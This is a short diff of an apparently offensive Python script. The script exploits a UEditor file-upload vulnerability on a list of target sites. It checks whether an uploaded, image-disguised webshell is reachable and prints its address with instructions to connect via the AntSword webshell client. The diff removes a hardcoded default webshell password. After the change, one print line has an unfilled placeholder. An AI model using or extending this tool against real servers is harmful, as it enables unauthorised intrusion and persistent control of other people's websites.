@@ -36,10 +36,10 @@ for i in file:
         r = re.findall(r'"url":"(.*?)"', resp.text)[0]
         webshell_path = i + "/" + r
         resp1 = requests.get(webshell_path)
-        mima = "2023SecNTXD_[Aa123456!!]"
+        
         if "JFIF" in resp1.text:
             print("\033[0;32;40m[+] 存在ueditor文件上传漏洞,webshell地址为: {}\033[0m".format(webshell_path))
-            print("\033[0;32;40m请使用蚁剑连接,默认密码: {}\033[0m".format(mima))
+            print("\033[0;32;40m请使用蚁剑连接 {}\033[0m")
             print("\n")
         else:
             print("访问目标webshell地址失败 {0} 状态码{1}".format(webshell_path,resp1.status_code))
